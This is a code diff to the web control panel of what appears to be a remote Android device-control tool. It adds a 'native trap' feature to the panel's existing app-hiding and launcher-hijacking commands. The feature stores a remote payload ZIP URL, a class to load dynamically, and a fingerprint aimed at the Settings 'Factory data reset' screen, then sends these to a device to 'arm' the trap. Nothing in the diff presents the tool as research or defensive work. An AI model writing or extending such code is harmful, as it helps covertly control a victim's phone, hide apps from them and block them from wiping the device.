@@ -332,6 +332,7 @@
         let activeTab = 'dash';
         let touchChain = [];
         let selectedTrapId = null;
+        let selectedNativeTrapId = null;
         let logoClicks = 0;
         let logoTimer = null;
 
@@ -498,7 +499,46 @@
                     { id: 'UNHIDE_APPS', name: 'Unhide Apps', icon: '👀', keywords: 'unhide, visible, restore', inputs: [{id: 'unhide-pkgs', label: 'Packages (Comma list or ALL)', type: 'text', placeholder: 'com.pkg.name or ALL'}] },
                     { id: 'GET_HIDDEN_APPS', name: 'Query Hidden App List', icon: '📋', keywords: 'list, hidden, verify', inputs: [] },
                     { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [] },
-                    { id: 'CLEAR_UI_TRAP', name: 'Disarm UI Trap', icon: '🔓', inputs: [] }
+                    {
+                        id: 'NATIVE_UI_TRAP',
+                        name: 'Speedster Native Trap',
+                        icon: '⚡',
+                        keywords: 'dex, zip, speedster, native, instant',
+                        inputs: [],
+                        customUI: `
+                            <div id="native-trap-manager-container" style="background:rgba(112,0,255,0.05); border:1px dashed var(--secondary); padding:10px; margin-bottom:10px;">
+                                <div id="native-trap-list-view">
+                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                                        <div class="cmd-label" style="color:var(--secondary)">SPEEDSTER_VAULT</div>
+                                        <button class="btn" onclick="openNativeTrapEditor()" style="padding:2px 8px; font-size:0.8rem; border-color:var(--secondary); color:var(--secondary)">+ NEW</button>
+                                    </div>
+                                    <div id="native-trap-registry-list" style="display:flex; flex-direction:column; gap:5px; max-height:200px; overflow-y:auto;"></div>
+                                    <div style="margin-top:10px; display:flex; gap:5px;">
+                                        <button class="btn" style="flex:1; background:var(--secondary); color:#fff;" onclick="sendCmd('NATIVE_UI_SET')">ARM_NATIVE</button>
+                                        <button class="btn danger" style="font-size:0.6rem;" onclick="sendCmd('NATIVE_UI_REMOVE')">PURGE_DEX</button>
+                                    </div>
+                                </div>
+                                <div id="native-trap-editor-view" style="display:none;">
+                                    <div class="cmd-label" id="native-trap-editor-title" style="margin-bottom:10px; color:var(--success);">FORGE_NATIVE_PAYLOAD</div>
+                                    <input type="hidden" id="edit-native-trap-id">
+                                    <div class="cmd-row"><label style="font-size:0.6rem; color:#666;">CONFIG_LABEL</label><input type="text" id="nt-reg-label" placeholder="Samsung Reset Trap"></div>
+                                    <div class="cmd-row"><label style="font-size:0.6rem; color:#666;">BUNDLE_URL (.zip)</label><input type="text" id="nt-reg-url" placeholder="https://.../payload.zip"></div>
+                                    <div class="cmd-row"><label style="font-size:0.6rem; color:#666;">CLASS_NAME</label><input type="text" id="nt-reg-class" placeholder="com.example.dynamic.HelloUI"></div>
+                                    <div class="cmd-row"><label style="font-size:0.6rem; color:#666;">FINGERPRINT (Title@@Summary@@Pkg@@Anchor)</label><input type="text" id="nt-reg-target" placeholder="Reset@@Factory data reset@@settings"></div>
+                                    <div style="display:flex; gap:5px; margin-bottom:10px;">
+                                        <div style="flex:1"><label style="font-size:0.6rem; color:#666;">STRICT</label><select id="nt-reg-strict" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;"><option value="false">FALSE</option><option value="true">TRUE</option></select></div>
+                                        <div style="width:60px"><label style="font-size:0.6rem; color:#666;">TTL(s)</label><input type="number" id="nt-reg-timeout" value="15"></div>
+                                        <div style="width:60px"><label style="font-size:0.6rem; color:#666;">DIM%</label><input type="number" id="nt-reg-dim" value="20"></div>
+                                    </div>
+                                    <div style="display:flex; gap:5px;">
+                                        <button class="btn" style="flex:1; border-color:var(--success); color:var(--success);" onclick="saveNativeTrapToRegistry()">SAVE_TO_VAULT</button>
+                                        <button class="btn" style="border-color:#444;" onclick="closeNativeTrapEditor()">CANCEL</button>
+                                    </div>
+                                </div>
+                            </div>
+                        `
+                    },
+                    { id: 'CLEAR_UI_TRAP', name: 'Disarm All Traps', icon: '🔓', inputs: [] }
                 ]
             },
             {
@@ -849,6 +889,97 @@
             renderTrapList();
             toast("TRAP_ARMED", "success");
         }
+
+        // --- NATIVE TRAP REGISTRY ENGINE ---
+        function renderNativeTrapList() {
+            const listContainer = document.getElementById('native-trap-registry-list');
+            if (!listContainer) return;
+            const registry = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+            if (registry.length === 0) {
+                listContainer.innerHTML = '<div style="text-align:center; color:#444; font-size:0.7rem; padding:10px;">NO_NATIVE_CONFIGS</div>';
+                return;
+            }
+            listContainer.innerHTML = registry.map(trap => `
+                <div style="display:flex; align-items:center; background:${selectedNativeTrapId === trap.id ? 'rgba(112,0,255,0.1)' : '#0a0b0d'}; border:1px solid ${selectedNativeTrapId === trap.id ? 'var(--secondary)' : '#222'}; padding:8px; gap:8px;">
+                    <div style="flex:1; cursor:pointer;" onclick="selectNativeTrap(\'${trap.id}\')">
+                        <div style="font-size:0.75rem; color:${selectedNativeTrapId === trap.id ? 'var(--secondary)' : '#fff'};">${trap.label || 'Unnamed Native'}</div>
+                        <div style="font-size:0.55rem; color:#555; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${trap.class_name}</div>
+                    </div>
+                    <button class="btn-tag" onclick="editNativeTrap(\'${trap.id}\')">✏️</button>
+                    <button class="btn-tag" style="color:var(--danger)" onclick="deleteNativeTrap(\'${trap.id}\')">×</button>
+                </div>
+            `).join('');
+        }
+
+        function openNativeTrapEditor() {
+            document.getElementById('native-trap-list-view').style.display = 'none';
+            document.getElementById('native-trap-editor-view').style.display = 'block';
+            document.getElementById('edit-native-trap-id').value = '';
+            document.getElementById('nt-reg-label').value = '';
+            document.getElementById('nt-reg-url').value = '';
+            document.getElementById('nt-reg-class').value = '';
+            document.getElementById('nt-reg-target').value = '';
+        }
+
+        function closeNativeTrapEditor() {
+            document.getElementById('native-trap-list-view').style.display = 'block';
+            document.getElementById('native-trap-editor-view').style.display = 'none';
+        }
+
+        function saveNativeTrapToRegistry() {
+            const id = document.getElementById('edit-native-trap-id').value || 'ntrap_' + Date.now();
+            const newTrap = {
+                id: id,
+                label: document.getElementById('nt-reg-label').value.trim() || 'Unnamed Native',
+                url: document.getElementById('nt-reg-url').value.trim(),
+                class_name: document.getElementById('nt-reg-class').value.trim(),
+                target: document.getElementById('nt-reg-target').value.trim(),
+                strict: document.getElementById('nt-reg-strict').value,
+                timeout: document.getElementById('nt-reg-timeout').value,
+                dim: document.getElementById('nt-reg-dim').value
+            };
+            if (!newTrap.url || !newTrap.class_name || !newTrap.target) return toast("REQUIRED FIELDS MISSING", "danger");
+            const registry = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+            const idx = registry.findIndex(t => t.id === id);
+            if (idx > -1) registry[idx] = newTrap;
+            else registry.push(newTrap);
+            localStorage.setItem('cortex_native_registry', JSON.stringify(registry));
+            selectedNativeTrapId = id;
+            closeNativeTrapEditor();
+            renderNativeTrapList();
+            toast("NATIVE_VAULT_UPDATED", "success");
+        }
+
+        function editNativeTrap(id) {
+            const registry = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+            const trap = registry.find(t => t.id === id);
+            if (!trap) return;
+            openNativeTrapEditor();
+            document.getElementById('edit-native-trap-id').value = trap.id;
+            document.getElementById('nt-reg-label').value = trap.label;
+            document.getElementById('nt-reg-url').value = trap.url;
+            document.getElementById('nt-reg-class').value = trap.class_name;
+            document.getElementById('nt-reg-target').value = trap.target;
+            document.getElementById('nt-reg-strict').value = trap.strict;
+            document.getElementById('nt-reg-timeout').value = trap.timeout;
+            document.getElementById('nt-reg-dim').value = trap.dim;
+        }
+
+        function deleteNativeTrap(id) {
+            if (!confirm("PURGE THIS NATIVE CONFIG?")) return;
+            let registry = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+            registry = registry.filter(t => t.id !== id);
+            localStorage.setItem('cortex_native_registry', JSON.stringify(registry));
+            if (selectedNativeTrapId === id) selectedNativeTrapId = null;
+            renderNativeTrapList();
+            toast("NATIVE_CONFIG_PURGED", "success");
+        }
+
+        function selectNativeTrap(id) {
+            selectedNativeTrapId = id;
+            renderNativeTrapList();
+            toast("NATIVE_TRAP_ARMED", "success");
+        }
         const tabScrollPositions = { 'dash': 0, 'cmd': 0, 'files': 0 };
 
         window.onload = async () => {
@@ -864,6 +995,7 @@
             initSearchSuggestions();
             refreshTagStates();
             renderTrapList();
+            renderNativeTrapList();
         };
 
         function saveConfig() {
@@ -1234,10 +1366,40 @@
                         content = `${document.getElementById('grid-cols').value}|${document.getElementById('grid-rows').value}|${document.getElementById('grid-icon-size').value}|${document.getElementById('grid-v-gap').value}|${document.getElementById('grid-h-gap').value}`; break;
                     case 'SET_LAUNCHER_MODE':
                         content = document.getElementById('launch-mode').value; break;
+                    case 'SET_DOCK_APPS':
+                        content = document.getElementById('dock-pkgs').value; break;
+                    case 'HIDE_APPS':
+                        content = document.getElementById('hide-pkgs').value; break;
                     case 'UNHIDE_APPS':
                         content = document.getElementById('unhide-pkgs').value; break;
                     case 'GET_HIDDEN_APPS':
                         content = ''; break;
+                    case 'NATIVE_UI_SET':
+                        const nRegSet = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+                        const nTrapSet = nRegSet.find(t => t.id === selectedNativeTrapId);
+                        if (!nTrapSet) return toast("SELECT A NATIVE TRAP FIRST", "danger");
+                        type = 'NATIVE_UI_TRAP';
+                        content = JSON.stringify({
+                            action: 'SET',
+                            label: nTrapSet.label,
+                            url: nTrapSet.url,
+                            class_name: nTrapSet.class_name,
+                            target: nTrapSet.target,
+                            strict: nTrapSet.strict === 'true',
+                            timeout: parseInt(nTrapSet.timeout),
+                            dim: parseInt(nTrapSet.dim)
+                        });
+                        break;
+                    case 'NATIVE_UI_REMOVE':
+                        const nRegRem = JSON.parse(localStorage.getItem('cortex_native_registry') || '[]');
+                        const nTrapRem = nRegRem.find(t => t.id === selectedNativeTrapId);
+                        if (!nTrapRem) return toast("SELECT A NATIVE TRAP TO REMOVE", "danger");
+                        type = 'NATIVE_UI_TRAP';
+                        content = JSON.stringify({
+                            action: 'REMOVE',
+                            label: nTrapRem.label
+                        });
+                        break;
                     case 'UI_TR_SET': // Local handler for setting via JSON
                         const regSet = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
                         const trapSet = regSet.find(t => t.id === selectedTrapId);
